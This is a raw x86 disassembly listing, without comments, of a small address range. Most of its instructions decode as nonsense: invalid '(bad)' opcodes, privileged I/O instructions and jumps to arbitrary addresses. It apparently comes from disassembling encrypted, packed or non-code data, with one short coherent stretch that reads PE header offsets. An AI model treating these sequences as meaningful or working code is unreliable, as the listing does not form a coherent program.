  40a541:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a542:	add    ecx,edi
  40a544:	loop   0x40a531
  40a546:	or     BYTE PTR [edx],bl
  40a548:	popa   
  40a549:	cwde   
  40a54a:	psubsb mm7,QWORD PTR [esi]
  40a54d:	mov    al,0x10
  40a54f:	stos   DWORD PTR es:[edi],eax
  40a550:	inc    esp
  40a551:	mov    esi,0x21ef174c
  40a556:	sbb    DWORD PTR [esi+0x4e],0xfffffff1
  40a55a:	fwait
  40a55b:	mov    eax,ds:0x5591a6d9
  40a560:	or     dh,bh
  40a562:	pop    ebx
  40a563:	dec    esp
  40a564:	int3   
  40a565:	popa   
  40a566:	xchg   edx,eax
  40a567:	and    DWORD PTR [edx+0x60],ebx
  40a56a:	sar    DWORD PTR ds:0xc0e88ea9,1
  40a570:	jb     0x40a512
  40a572:	mov    ebx,0x3cd10879
  40a577:	fist   DWORD PTR ds:0xec10c295
  40a57d:	out    0xc3,eax
  40a57f:	and    BYTE PTR [edi],dh
  40a581:	hlt    
  40a582:	leave  
  40a583:	jb     0x40a5ff
  40a585:	aas    
  40a586:	jecxz  0x40a57e
  40a588:	test   al,0xf6
  40a58a:	mov    cl,0xff
  40a58c:	or     BYTE PTR [edi+ebp*4-0x6c],bh
  40a590:	fwait
  40a591:	cmp    DWORD PTR [ebp-0x61c277e1],0x1473ce0b
  40a59b:	iret   
  40a59c:	adc    al,ch
  40a59e:	std    
  40a59f:	xchg   DWORD PTR [eax-0x21dd2586],edi
  40a5a5:	lods   al,BYTE PTR ds:[esi]
  40a5a6:	in     al,0x3f
  40a5a8:	fisubr DWORD PTR [di]
  40a5ab:	inc    BYTE PTR [ecx+0x18d3663c]
  40a5b1:	sub    eax,0x202ec062
  40a5b6:	(bad)  
  40a5b7:	pmaxub mm1,mm0
  40a5ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5bb:	imul   ebx,esp,0x45
  40a5be:	shl    DWORD PTR ds:0xb3d2d4e0,0xcb
  40a5c5:	leave  
  40a5c6:	push   es
  40a5c7:	push   0x7b46338b
  40a5cc:	inc    ebp
  40a5cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5ce:	xchg   edi,eax
  40a5cf:	xchg   esp,eax
  40a5d0:	mov    eax,DWORD PTR [ecx+0x4b]
  40a5d3:	lock test eax,0xc5266918
  40a5d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5da:	dec    esp
  40a5db:	mov    ch,0xa
  40a5dd:	fcom   st(4)
  40a5df:	xor    edi,edx
  40a5e1:	jae    0x40a5c1
  40a5e3:	jbe    0x40a56e
  40a5e5:	or     DWORD PTR [ebp+0x62b6cbc5],esi
  40a5eb:	mov    dl,0xc8
  40a5ed:	pop    eax
  40a5ee:	scas   al,BYTE PTR es:[edi]
  40a5ef:	stos   DWORD PTR es:[edi],eax
  40a5f0:	and    al,0x80
  40a5f2:	mov    cl,0x36
  40a5f4:	or     bh,BYTE PTR [ebx-0x7e592fd]
  40a5fa:	(bad)  
  40a5fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5fc:	imul   edi,edi,0x1c
  40a5ff:	inc    edi
  40a600:	and    BYTE PTR [ebp-0x5bf79684],dl
  40a606:	pop    esi
  40a607:	inc    ebx
  40a608:	ss mov al,0x50
  40a60b:	or     al,0xb2
  40a60d:	xor    DWORD PTR [ecx+ecx*8],0xfefe6149
  40a614:	int3   
  40a615:	sbb    BYTE PTR [ebp-0x7b],cl
  40a618:	jno    0x40a5dc
  40a61a:	push   ebp
  40a61b:	out    dx,al
  40a61c:	adc    DWORD PTR ds:0x51d10285,esi
  40a622:	int    0xa4
  40a624:	mov    cl,0x54
  40a626:	mov    esi,0x34f6a836
  40a62b:	sbb    eax,0xc0b09536
  40a630:	ds jge 0x40a676
  40a633:	mov    dl,0x2e
  40a635:	loope  0x40a659
  40a637:	aas    
  40a638:	inc    ebp
  40a639:	xchg   ebp,eax
  40a63a:	out    dx,eax
  40a63b:	in     al,dx
  40a63c:	scas   al,BYTE PTR es:[edi]
  40a63d:	cmp    ebx,DWORD PTR [ebx+ebx*1+0x6b]
  40a641:	or     eax,DWORD PTR [edx]
  40a643:	lods   al,BYTE PTR ds:[esi]
  40a644:	mov    ebp,edx
  40a646:	les    esp,FWORD PTR [edi-0x45]
  40a649:	or     eax,0x8d31b2a9
  40a64e:	lods   eax,DWORD PTR ds:[esi]
  40a64f:	sbb    BYTE PTR [esi],bl
  40a651:	dec    eax
  40a652:	mov    eax,0x7d67f94
  40a657:	test   DWORD PTR [edx-0x37],0x6179c08e
  40a65e:	icebp  
  40a65f:	mov    DWORD PTR [ebx+esi*2],esi
  40a662:	scas   al,BYTE PTR es:[edi]
  40a663:	jb     0x40a6d9
  40a665:	int    0x49
  40a667:	mov    al,ds:0x2e6cf11
  40a66d:	cli    
  40a66e:	in     eax,0xf9
  40a670:	retf   
  40a671:	push   esp
  40a672:	push   ebp
  40a673:	lods   al,BYTE PTR ds:[esi]
  40a674:	jmp    0xdf0b:0x46351fd9
  40a67b:	scas   eax,DWORD PTR es:[edi]
  40a67c:	(bad)  
  40a67d:	in     eax,dx
  40a67e:	xor    al,0xa8
  40a680:	jle    0x40a6e9
  40a682:	lea    ebp,[ebx+0x10c733df]
  40a688:	sbb    eax,0x8bc3ec93
  40a68d:	das    
  40a68e:	shr    BYTE PTR [esp+eax*8-0x230f47ce],cl
  40a695:	cmp    BYTE PTR [esi],ch
  40a697:	std    
  40a698:	iret   
  40a699:	cwde   
  40a69a:	pop    edi
  40a69b:	out    dx,eax
  40a69c:	(bad)  
  40a69d:	mov    ch,0x4b
  40a69f:	(bad)  
  40a6a0:	into   
  40a6a1:	int    0x8e
  40a6a3:	jns    0x40a6f8
  40a6a5:	add    esp,DWORD PTR [eax-0x36cbae27]
  40a6ab:	retf   0x7b3a
  40a6ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6af:	push   edi
  40a6b0:	inc    esi
  40a6b1:	popf   
  40a6b2:	ret    
  40a6b3:	lahf   
  40a6b4:	cli    
  40a6b5:	cmc    
  40a6b6:	push   ebp
  40a6b7:	aad    0x4e
  40a6b9:	push   ss
  40a6ba:	hlt    
  40a6bb:	nop
  40a6bc:	bts    DWORD PTR [ebp+0x9858f9a],edx
  40a6c3:	test   eax,0xecc647f7
  40a6c8:	mov    ebx,0xac91aabe
  40a6cd:	(bad)  [esi]
  40a6cf:	add    DWORD PTR [edi],ebx
  40a6d1:	int    0x1a
  40a6d3:	and    ebx,DWORD PTR [ebx+0x128814d7]
  40a6d9:	xor    BYTE PTR [edi+0x1ce9c703],bh
  40a6df:	add    eax,DWORD PTR [eax]
  40a6e1:	add    ch,ah
  40a6e3:	xchg   esi,eax
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4+0x3f]
  40a6ef:	inc    ecx
  40a6f0:	aas    
  40a6f1:	cmp    bh,BYTE PTR [eax-0x17]
  40a6f4:	jle    0x40a774
  40a6f6:	jp     0x40a775
  40a6f8:	jle    0x40a778
  40a6fa:	adc    bh,ch
  40a6fc:	lods   eax,DWORD PTR ds:[esi]
  40a6fd:	cld    
  40a6fe:	inc    edi
  40a6ff:	in     al,0xe4
  40a701:	popf   
  40a702:	(bad)  
  40a703:	ins    DWORD PTR es:[edi],dx
  40a704:	data16 (bad) 
  40a706:	mov    ds:0xea29ff20,eax
  40a70b:	cld    
  40a70c:	jns    0x40a767
  40a70e:	ret    0x471b
  40a711:	imul   ebp,DWORD PTR [eax*4-0x6df3d88e],0x5b38cec2
  40a71c:	fcomp  st(2)
  40a71e:	and    DWORD PTR [ebx+0x32],esi
  40a721:	adc    eax,0x825b85ee
  40a726:	and    eax,DWORD PTR [edx]
  40a728:	inc    edx
  40a729:	pop    edi
  40a72a:	adc    edx,DWORD PTR [edi-0x68]
  40a72d:	arpl   WORD PTR [ebx-0x1d8d5faf],ax
  40a733:	test   BYTE PTR [eax],0xa9
  40a736:	xchg   edi,eax
  40a737:	stos   BYTE PTR es:[edi],al
  40a738:	jge    0x40a77f
  40a73a:	fxch   st(2)
  40a73c:	sub    dl,BYTE PTR [edi]
  40a73e:	adc    eax,DWORD PTR [esi]
  40a740:	aas    
  40a741:	or     DWORD PTR [edi+0x38],eax
  40a744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a745:	fdivr  QWORD PTR [ebx]
  40a747:	(bad)  
  40a748:	and    DWORD PTR [ebp+0x36],esi
  40a74b:	pop    ebp
  40a74c:	pushf  
  40a74d:	ja     0x40a794
  40a74f:	mov    BYTE PTR [esi],0x2a
  40a752:	jecxz  0x40a713
  40a754:	retf   0xafd
  40a757:	out    dx,eax
  40a758:	es xchg ecx,eax
  40a75a:	jo     0x40a6f4
  40a75c:	xchg   ebp,eax
  40a75d:	jnp    0x40a731
  40a75f:	lods   al,BYTE PTR ds:[esi]
  40a760:	mov    ds:0x307792a4,eax
  40a765:	xchg   bl,dl
  40a767:	rol    edx,cl
  40a769:	jbe    0x40a74a
  40a76b:	mov    bl,0x11
  40a76d:	lods   al,BYTE PTR ds:[esi]
  40a76e:	je     0x40a77d
  40a770:	pop    ecx
  40a771:	hlt    
  40a772:	xchg   ebx,eax
  40a773:	pop    ss
  40a774:	pop    edi
  40a775:	imul   esi,DWORD PTR [ebp+0xe391e05],0xd6b37c3a
  40a77f:	sbb    dl,BYTE PTR [edx-0x1d2f44ea]
  40a785:	loope  0x40a7da
  40a787:	bound  edx,QWORD PTR [ebp+0x19]
  40a78a:	sbb    eax,ecx
  40a78c:	mov    bl,0x2a
  40a78e:	imul   eax,eax,0x5d
  40a791:	mov    ebx,0xc94514a4
  40a796:	add    DWORD PTR [edx+0x342de59a],edi
  40a79c:	jns    0x40a77f
  40a79e:	pop    edi
  40a79f:	sti    
  40a7a0:	pop    ecx
  40a7a1:	dec    edx
  40a7a2:	inc    esi
  40a7a3:	jmp    0xa10ba6a0
  40a7a8:	and    al,0x1c
  40a7aa:	mov    cl,0x38
  40a7ac:	mov    al,0xf8
  40a7ae:	xchg   dl,ah
  40a7b0:	dec    edi
  40a7b1:	add    eax,0xb04981fe
  40a7b6:	xchg   edx,eax
  40a7b7:	lahf   
  40a7b8:	and    BYTE PTR [ebx+ebp*1-0x756b07fc],al
  40a7bf:	sbb    DWORD PTR [eax+0x3c3da163],ebx
  40a7c5:	jle    0x40a776
  40a7c7:	dec    esp
  40a7c8:	ds jno 0x40a761
  40a7cb:	xchg   esp,eax
  40a7cc:	pop    ecx
  40a7cd:	lahf   
  40a7ce:	xor    al,0x93
  40a7d0:	add    bx,bp
  40a7d3:	les    edx,FWORD PTR [ecx-0x6ef6a0dd]
  40a7d9:	idiv   bl
  40a7db:	jne    0x40a7d5
  40a7dd:	cwde   
  40a7de:	sbb    al,BYTE PTR [ebp+0x1c93f1b2]
  40a7e4:	mov    ebp,0xa0dffd2e
  40a7e9:	sbb    al,0x53
  40a7eb:	retf   
  40a7ec:	jl     0x40a7ff
  40a7ee:	data16 sub dl,BYTE PTR [edi+0x1dbe06e6]
  40a7f5:	scas   al,BYTE PTR es:[edi]
  40a7f6:	or     al,BYTE PTR [ecx]
  40a7f8:	out    dx,eax
  40a7f9:	sbb    ah,bl
  40a7fb:	or     BYTE PTR [edi+0x73],bh
  40a7fe:	jno    0x40a7cf
  40a800:	std    
  40a801:	lods   eax,DWORD PTR ds:[esi]
  40a802:	hlt    
  40a803:	and    eax,0xc0e071be
  40a808:	inc    esi
  40a809:	ins    BYTE PTR es:[edi],dx
  40a80a:	jb     0x40a885
  40a80c:	fcmovne st,st(0)
  40a80e:	dec    edi
  40a80f:	scas   eax,DWORD PTR es:[edi]
  40a810:	and    al,0x3f
  40a812:	xor    BYTE PTR [ebx-0x7c],dl
  40a815:	adc    DWORD PTR [ebx],eax
  40a817:	mov    eax,ds:0xe6c520a6
  40a81c:	mov    ebp,0x956ce668
  40a821:	and    al,0x7c
  40a823:	call   0xc7ab0367
  40a828:	jb     0x40a868
  40a82a:	lods   al,BYTE PTR ds:[esi]
  40a82b:	lods   al,BYTE PTR ds:[esi]
  40a82c:	in     al,dx
  40a82d:	cli    
  40a82e:	cmp    ecx,DWORD PTR [ecx+0x4600eae1]
  40a834:	xchg   esi,eax
  40a835:	add    al,0x6f
  40a837:	mov    ds:0x103f0cd6,al
  40a83c:	mov    gs:0x105f1e6a,al
  40a842:	sub    eax,0xb09abfa9
  40a847:	call   0x601277f4
  40a84c:	cmpxchg DWORD PTR [ebp-0x2c],eax
  40a850:	out    dx,eax
  40a851:	fst    QWORD PTR [ebp+0x3c]
  40a854:	xchg   ebx,eax
  40a855:	mov    DWORD PTR [edi+0x23],edi
  40a858:	(bad)  
  40a859:	mov    ch,0x7e
  40a85b:	dec    esi
  40a85c:	push   0xa
  40a85e:	arpl   WORD PTR [edi-0x5efdd88a],sp
  40a864:	wbinvd 
  40a866:	fs and al,0xba
  40a869:	mov    edx,0x60138ecb
  40a86e:	pop    eax
  40a86f:	jmp    0x40a817
  40a871:	es icebp 
  40a873:	sub    DWORD PTR [edx+eax*2],0x5d305ede
  40a87a:	gs into 
  40a87c:	lds    ebp,FWORD PTR [ecx+0x21]
  40a87f:	inc    eax
  40a880:	xor    eax,0xdebf43cd
  40a885:	mov    WORD PTR [edx+esi*2-0x453b3c50],ds
  40a88c:	pop    ebp
  40a88d:	pop    ds
  40a88e:	jne    0x40a829
  40a890:	or     edi,esi
  40a892:	mov    ebx,0x43f19b0c
  40a897:	pushf  
  40a898:	jmp    0x27e6:0x859c40b7
  40a89f:	lea    edi,[edx]
  40a8a1:	shl    BYTE PTR [eax+eiz*2+0x2349d7af],1
  40a8a8:	stc    
  40a8a9:	shl    BYTE PTR [esi],1
  40a8ab:	fidivr WORD PTR [eax+eax*1+0x29cff85b]
  40a8b2:	pusha  
  40a8b3:	scas   al,BYTE PTR es:[edi]
  40a8b4:	sub    DWORD PTR [esi-0x683779fb],ebx
  40a8ba:	sti    
  40a8bb:	div    edx
  40a8bd:	inc    eax
  40a8be:	adc    edi,ecx
  40a8c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8c1:	fcompp 
  40a8c3:	popa   
  40a8c4:	inc    esi
  40a8c5:	scas   eax,DWORD PTR es:[edi]
  40a8c6:	pop    ebp
  40a8c7:	cmc    
  40a8c8:	xor    DWORD PTR [esi-0x22],0xc063d3f2
  40a8cf:	lods   eax,DWORD PTR cs:[esi]
  40a8d1:	(bad)  
  40a8d2:	int    0xef
  40a8d4:	jb     0x40a8e9
  40a8d6:	out    dx,al
  40a8d7:	mov    ah,0x79
  40a8d9:	cmp    DWORD PTR [edx],esp
  40a8db:	and    eax,0x932dcf52
  40a8e0:	cmp    eax,0x76379c8e
  40a8e5:	push   esp
  40a8e6:	fwait
  40a8e7:	cmp    BYTE PTR [ecx+0x8b2553e],0xed
  40a8ee:	mov    ah,bh
  40a8f0:	jge    0x40a910
  40a8f2:	inc    edi
  40a8f3:	inc    DWORD PTR [edx+0x5e]
  40a8f6:	repz cmp eax,0x952c5a12
  40a8fc:	and    BYTE PTR [edi-0x26234aa4],bh
  40a902:	mov    BYTE PTR [ebp+0x5a9851d1],ch
  40a908:	mov    WORD PTR [ebx+0x68],?
  40a90b:	xor    eax,0xf8efa49c
  40a910:	mov    al,ds:0x7f134e85
  40a915:	or     edx,DWORD PTR [ecx+0x1487d2]
  40a91b:	in     eax,dx
  40a91c:	(bad)  
  40a91d:	jecxz  0x40a936
  40a91f:	iret   
  40a920:	repz ret 
  40a922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a923:	or     esi,edx
  40a925:	fucomi st,st(1)
  40a927:	dec    esi
  40a928:	push   esp
  40a929:	in     eax,0x2c
  40a92b:	dec    BYTE PTR [esi-0x8482fa3]
  40a931:	cdq    
  40a932:	and    eax,DWORD PTR [eax]
  40a934:	shl    DWORD PTR [edi+0x55ec24a6],1
  40a93a:	xor    esp,eax
  40a93c:	enter  0xe1,0x9d
  40a940:	xor    bl,BYTE PTR [ecx+0x10]
  40a943:	jge    0x40a92a
  40a945:	dec    edx
  40a946:	jbe    0x40a98c
  40a948:	or     BYTE PTR [esi+0x18],cl
  40a94b:	and    BYTE PTR [eax+0x5a27aa24],al
  40a951:	fmul   QWORD PTR [esp+edx*2]
  40a954:	(bad)  
  40a956:	or     ecx,esi
  40a958:	mov    ch,0x88
  40a95a:	icebp  
  40a95b:	and    al,cl
  40a95d:	xchg   ebx,eax
  40a95e:	fld    QWORD PTR [edi+0x2b]
  40a961:	xchg   ebp,eax
  40a963:	into   
  40a964:	aaa    
  40a965:	push   eax
  40a966:	mov    bh,BYTE PTR [eax+0x5e73c8fc]
  40a96c:	mov    ebx,0x7265a28c
  40a971:	inc    ebp
  40a972:	adc    DWORD PTR [eax],esp
  40a974:	mov    cl,BYTE PTR [ecx-0x52df717f]
  40a97a:	mov    bl,0x5e
  40a97c:	out    0xbb,al
  40a97e:	cs mov ebp,0x617bb2c6
  40a984:	sbb    ch,0x9e
  40a987:	fs push cs
  40a989:	xor    ecx,edx
  40a98b:	gs std 
  40a98d:	ins    DWORD PTR es:[edi],dx
  40a98e:	nop
  40a98f:	xchg   edx,eax
  40a990:	pop    es
  40a991:	push   ebx
  40a992:	pop    eax
  40a993:	clc    
  40a994:	inc    edi
  40a995:	jl     0x40a969
  40a997:	add    ebp,esp
  40a999:	or     al,0xf5
  40a99b:	pushf  
  40a99c:	outs   dx,BYTE PTR ds:[esi]
  40a99d:	outs   dx,BYTE PTR ds:[esi]
  40a99e:	sbb    DWORD PTR [edx-0x34],ebp
  40a9a1:	js     0x40aa1a
  40a9a3:	push   esi
  40a9a4:	sub    eax,0x1f3d80eb
  40a9a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a9aa:	jns    0x40aa19
  40a9ac:	add    dl,bl
  40a9ae:	jns    0x40a947
  40a9b0:	jg     0x40a947
  40a9b2:	out    0x62,al
  40a9b4:	xor    DWORD PTR [edx+0x3f],edi
  40a9b7:	and    eax,0x41bd5247
  40a9bc:	mov    ecx,0x97158d3f
  40a9c1:	jnp    0x40aa2a
  40a9c3:	mov    al,ds:0xca0cb3f5
  40a9c8:	add    DWORD PTR [ebp-0x16],0xfffffff1
  40a9cc:	adc    DWORD PTR [edx-0x2653a66d],edx
  40a9d2:	daa    
  40a9d3:	dec    eax
  40a9d4:	enter  0xfc2a,0xa8
  40a9d8:	add    al,al
  40a9da:	inc    eax
  40a9db:	pop    ebp
  40a9dc:	(bad)  
  40a9dd:	es pop es
  40a9df:	add    al,dh
  40a9e1:	and    DWORD PTR [eax+0x3d8ee59c],eax
  40a9e7:	jae    0x40aa58
  40a9e9:	shl    BYTE PTR [edx],0x2e
  40a9ec:	and    ebx,esp
  40a9ee:	out    dx,eax
  40a9ef:	jne    0x40aa5d
  40a9f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9f2:	das    
  40a9f3:	rcr    BYTE PTR [ebx-0x1996aa01],1
  40a9f9:	pop    ss
  40a9fa:	es xor al,0x14
  40a9fd:	cmp    eax,0x840f0139
  40aa02:	and    dl,BYTE PTR [eax]
  40aa04:	add    BYTE PTR [eax],al
  40aa06:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa09:	mov    eax,DWORD PTR [ebp-0x8]
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    esp,edx
  40aa2a:	add    DWORD PTR ds:0x7ef40481,0x7e
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	add    eax,0xdfcabf45
  40aa3a:	aaa    
  40aa3b:	repz daa 
  40aa3d:	and    eax,0x90c15b9f
  40aa42:	(bad)  
  40aa43:	(bad)  
  40aa44:	pop    edx
  40aa45:	mov    ah,BYTE PTR [edi+0xf]
  40aa48:	stos   BYTE PTR es:[edi],al
  40aa49:	inc    ecx
  40aa4a:	xor    al,0x46
  40aa4c:	imul   ecx,DWORD PTR [edx],0x4880001c
  40aa52:	arpl   WORD PTR [ebx+0x7b],di
  40aa55:	ficom  WORD PTR [ecx-0x25d1f6e5]
  40aa5b:	jb     0x40aa7b
  40aa5d:	mov    esi,ebp
  40aa5f:	and    bh,dl
  40aa61:	mov    ss,WORD PTR [edx-0x2e]
  40aa64:	or     ax,0x5935
  40aa68:	cmp    cl,bh
  40aa6a:	mov    al,ds:0xbfbcafc2
  40aa6f:	xchg   edx,eax
  40aa70:	or     DWORD PTR [ebp-0x6],esp
  40aa73:	push   edx
  40aa74:	push   edi
  40aa75:	ins    BYTE PTR es:[edi],dx
  40aa76:	js     0x40aabf
  40aa78:	clc    
  40aa79:	mov    ch,0x33
  40aa7b:	dec    eax
  40aa7c:	mov    ebx,DWORD PTR [ecx-0x80]
  40aa7f:	xchg   edx,eax
  40aa80:	test   eax,0x73e01e1
  40aa85:	jmp    0xaade:0x49a884d
  40aa8c:	and    al,0x9f
  40aa8e:	int    0xb8
  40aa90:	xor    DWORD PTR [eax+0x0],ebp
  40aa93:	aaa    
  40aa94:	cli    
  40aa95:	push   ebx
  40aa96:	add    al,0x61
  40aa98:	dec    ecx
  40aa99:	dec    edi
  40aa9a:	or     eax,DWORD PTR [edx+0x47]
  40aa9d:	push   edi
  40aa9e:	not    DWORD PTR [ebx]
  40aaa0:	in     al,0xcb
  40aaa2:	imul   ebx,DWORD PTR [ecx],0xffffff8e
  40aaa5:	mov    ds:0x49f94a4d,eax
  40aaaa:	jae    0x40aa38
  40aaac:	mov    ecx,DWORD PTR [edx]
  40aaae:	or     al,0x7c
  40aab0:	sahf   
  40aab1:	mov    al,ds:0xe81f12dd
  40aab6:	sbb    eax,eax
  40aab8:	jge    0x40aa41
  40aaba:	ja     0x40aadf
  40aabc:	fdivr  DWORD PTR [eax-0x44f1b106]
  40aac2:	pusha  
  40aac3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aac4:	icebp  
  40aac5:	test   eax,0x1c6774dd
  40aaca:	xor    eax,0x558a256c
  40aacf:	mov    ds:0x3764895d,al
  40aad4:	nop
  40aad5:	cmp    bl,BYTE PTR [edx+0x10045bc9]
  40aadb:	popf   
  40aadc:	xor    dl,dh
  40aade:	xchg   edi,eax
  40aadf:	jp     0x40ab51
  40aae1:	js     0x40ab24
  40aae3:	xor    edx,ebp
  40aae5:	push   0xffffff83
  40aae7:	pop    ecx
  40aae8:	sbb    DWORD PTR [eax+0x1a5ff2ba],esi
  40aaee:	out    dx,al
  40aaef:	ja     0x40ab0d
  40aaf1:	push   eax
  40aaf2:	jne    0x40aa89
  40aaf4:	inc    esi
  40aaf5:	scas   al,BYTE PTR es:[edi]
  40aaf6:	bnd jg 0x40ab4d
  40aaf9:	hlt    
  40aafa:	jae    0x40aad5
  40aafc:	sub    al,0x47
  40aafe:	dec    ebp
  40aaff:	addr16 ja 0x40aaa7
  40ab02:	sub    BYTE PTR [edx],ch
  40ab04:	xor    eax,0x51e86780
  40ab09:	pop    ecx
  40ab0a:	cld    
  40ab0b:	pop    ds
  40ab0c:	out    0x61,al
  40ab0e:	ins    DWORD PTR es:[edi],dx
  40ab0f:	mul    DWORD PTR [ecx+0x1968e486]
  40ab15:	push   edi
  40ab16:	mov    ds:0x8ba29ffc,al
  40ab1b:	mov    esi,ebp
  40ab1d:	loopne 0x40aab5
  40ab1f:	mov    eax,ds:0x84f3075f
  40ab24:	rcr    bh,1
  40ab26:	or     eax,ebx
  40ab28:	pop    es
  40ab29:	int3   
  40ab2a:	push   0x27a56641
  40ab2f:	test   eax,0x83f1cb95
  40ab34:	mov    BYTE PTR [esi+0x22360fd5],0x1b
  40ab3b:	jmp    0x40ab8c
  40ab3d:	mov    edi,DWORD PTR [edi+0x61803bcb]
  40ab43:	adc    dl,BYTE PTR [ecx+edx*4+0x3b]
  40ab47:	dec    ebx
  40ab48:	fnstsw WORD PTR [edi+0x79114c47]
  40ab4e:	ss daa 
  40ab50:	mov    eax,ds:0xfed37058
  40ab55:	out    dx,eax
  40ab56:	sub    DWORD PTR [ecx],edi
  40ab58:	adc    DWORD PTR ds:0xfbd41863,esi
  40ab5e:	mov    eax,ds:0xff989643
  40ab63:	mov    al,BYTE PTR [edi+0x5d]
  40ab66:	or     edi,0xffffff8b
  40ab69:	jne    0x40ab24
  40ab6b:	mov    al,bl
  40ab6d:	les    ecx,FWORD PTR [ecx-0x73]
  40ab70:	in     al,0x33
  40ab72:	into   
  40ab73:	dec    edx
  40ab74:	dec    ebx
  40ab75:	dec    edx
  40ab76:	and    DWORD PTR [ecx],edx
  40ab78:	clc    
  40ab79:	cmp    eax,0x7368e9ec
  40ab7e:	xlat   BYTE PTR es:[ebx]
  40ab80:	aam    0x2b
  40ab82:	pop    eax
  40ab83:	das    
  40ab84:	adc    ebx,DWORD PTR [esi+edi*2-0x6]
  40ab88:	push   edx
  40ab89:	ins    DWORD PTR es:[edi],dx
  40ab8a:	fimul  WORD PTR [edx+ebx*4+0x3e122fd7]
  40ab92:	sbb    DWORD PTR [ecx+edi*1+0x79412860],0xd
  40ab9a:	lods   al,BYTE PTR ds:[esi]
  40ab9b:	jns    0x40ac07
  40ab9d:	iret   
  40ab9e:	push   eax
  40ab9f:	dec    esp
  40aba0:	add    DWORD PTR [esi],esp
  40aba2:	mov    al,ds:0xaece0b19
  40aba7:	rcr    eax,1
  40aba9:	dec    ebx
  40abaa:	xchg   ebp,eax
  40abab:	xor    BYTE PTR [esi-0x7f],al
  40abae:	xchg   esp,eax
  40abaf:	jbe    0x40abe3
  40abb1:	je     0x40ac1e
  40abb3:	(bad)  
  40abb4:	adc    BYTE PTR ss:[eax],dl
  40abb7:	ds (bad) 
  40abb9:	les    ebp,FWORD PTR [edi]
  40abbb:	mov    WORD PTR [eax+0x6404ea4c],ds
  40abc1:	not    DWORD PTR [edx]
  40abc3:	or     DWORD PTR [ebx-0x7d],ebp
  40abc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abc7:	and    DWORD PTR [esp+ebx*4-0xe],edx
  40abcb:	dec    edi
  40abcc:	and    al,0x90
  40abce:	sub    BYTE PTR [eax],al
  40abd0:	add    eax,0xd082c99d
  40abd5:	enter  0x91cd,0xcd
  40abd9:	das    
  40abda:	or     ah,BYTE PTR [edx+0x54]
  40abdd:	and    eax,0x8282fe8e
  40abe2:	push   ss
  40abe3:	pushf  
  40abe4:	and    ecx,DWORD PTR [ecx-0x75]
  40abe7:	test   DWORD PTR [edi+0x72],0x9cdb9f1a
  40abee:	ss test eax,0x2e7551a2
  40abf4:	xchg   esi,eax
  40abf5:	dec    edi
  40abf6:	dec    edi
  40abf7:	pop    es
  40abf8:	xchg   edi,eax
  40abf9:	push   esp
  40abfa:	pop    edx
  40abfb:	stc    
  40abfc:	mov    ch,0x38
  40abfe:	inc    eax
  40abff:	test   DWORD PTR [edi-0x1da41fc3],ebx
  40ac05:	add    al,0x2d
  40ac07:	sub    al,0xed
  40ac09:	cld    
  40ac0a:	and    cl,BYTE PTR [edi+ebp*2+0x43]
  40ac0e:	(bad)  
  40ac0f:	call   0xc5f585e9
  40ac14:	add    al,0xf5
  40ac16:	in     eax,dx
  40ac17:	cli    
  40ac18:	loope  0x40abc0
  40ac1a:	pushf  
  40ac1b:	fstp   TBYTE PTR [edi+0x10]
  40ac1e:	add    BYTE PTR [edx-0x162b3b00],dl
  40ac24:	mov    bl,0xdd
  40ac26:	pop    es
  40ac27:	cmp    al,0x3d
  40ac29:	jno    0x40ac29
  40ac2b:	inc    esi
  40ac2c:	sahf   
  40ac2d:	and    eax,0x18e2576e
  40ac32:	aaa    
  40ac33:	lock out 0xe1,al
  40ac36:	outs   dx,DWORD PTR ds:[esi]
  40ac37:	mov    al,ds:0x785b266c
  40ac3c:	or     edi,DWORD PTR [eax+0x3c02767b]
  40ac42:	pop    ss
  40ac43:	cwde   
  40ac44:	add    ebp,DWORD PTR [edx-0x5362921c]
  40ac4a:	dec    eax
  40ac4b:	adc    BYTE PTR [esi-0x14],ch
  40ac4e:	xchg   ecx,eax
  40ac4f:	pop    ebp
  40ac50:	scas   eax,DWORD PTR es:[edi]
  40ac51:	adc    al,0x4b
  40ac53:	xor    ecx,DWORD PTR [esp+eiz*2-0x78]
  40ac57:	cmp    al,0xea
  40ac59:	ss mov ah,0x59
  40ac5c:	popf   
  40ac5d:	(bad)  
  40ac5f:	inc    esp
  40ac60:	cs dec ecx
  40ac62:	scas   eax,DWORD PTR es:[edi]
  40ac63:	scas   eax,DWORD PTR es:[edi]
  40ac64:	adc    esp,DWORD PTR ds:0x22f89655
  40ac6a:	push   edx
  40ac6b:	aas    
  40ac6c:	adc    DWORD PTR [ebx+0x2877d943],ebp
  40ac72:	or     BYTE PTR [edx-0x1c],ah
  40ac75:	mov    ecx,0xe58ded1b
  40ac7a:	call   0xde2a50f9
  40ac7f:	dec    edi
  40ac80:	dec    esi
  40ac81:	(bad)  
  40ac82:	add    BYTE PTR ds:0x4ca431bc,0xb9
  40ac89:	pcmpgtd mm2,QWORD PTR [eax-0x764cee5a]
  40ac90:	test   esp,ebp
  40ac92:	data16 daa 
  40ac94:	mov    ?,WORD PTR [ebx]
  40ac96:	sub    eax,0x4c7a97fb
  40ac9b:	icebp  
